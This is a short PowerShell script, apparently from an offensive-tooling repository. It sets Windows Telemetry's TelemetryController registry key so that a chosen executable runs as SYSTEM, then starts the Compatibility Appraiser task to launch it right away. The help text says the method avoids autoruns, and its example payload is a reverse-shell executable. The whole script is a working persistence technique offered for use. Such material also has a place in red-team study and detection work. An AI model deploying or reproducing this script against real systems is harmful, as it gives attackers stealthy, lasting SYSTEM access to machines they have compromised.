function Run-TelemetryCommand 
{
    <#
   .Synopsis
      Enable Persistence through Windows Telemetry.
   .DESCRIPTION
      PowerShell script for running commands as SYSTEM through Windows Telemetry.
      Requires local admin rights to install (requires the ability to write to HKLM), but is not visible in autoruns.
   .EXAMPLE
      Run-Telemetry -Command C:\Windows\Temp\reverse_shell.exe
   .INPUTS
      -Command <file_to_execute>
      The target to run. Enter the full path (Ex: C:Windows\system32\notepad.exe)
   .OUTPUTS
      This script creates multiple registry entries under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController
   .NOTES
      Author: Beery, Christopher (https://github.com/zweilosec)
      Created: 27 Dec 2022
      Last Modified: 27 Dec 2022
      Useful Study Links:
      * https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/
   #>
   
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string]$Command
    )

    # Get default gateway
    $defaultGateway = (Get-NetIPConfiguration).IPv4DefaultGateway.NextHop

    # Check if machine has an active network connection by pinging default gateway (Telemetry requires an active network connection)
    $pingResult = Test-Connection -ComputerName $defaultGateway -Count 1
    if (!$pingResult) 
    {
        Write-Output "No active network connection. Telemetry will not run until connectivity is restored."
    } 
    else 
    {
        Write-Output "Active network connection detected"
    }
    
    # Add key to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController" -Force

    # Set value of "Command" in new key to .exe file specified in $command parameter
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController" -Name "Command" -Value $command

    # Set values for Maintenance, Nightly, and Oobe keys to 1
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController" -Name "Maintenance" -PropertyType DWORD -Value 1
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController" -Name "Nightly" -PropertyType DWORD -Value 1
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController" -Name "Oobe" -PropertyType DWORD -Value 1

    # Run the command immediately with this command, otherwise you will need to create your own scheduled task for better persistence (TODO:)
    Start-ScheduledTask -TaskName "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
}
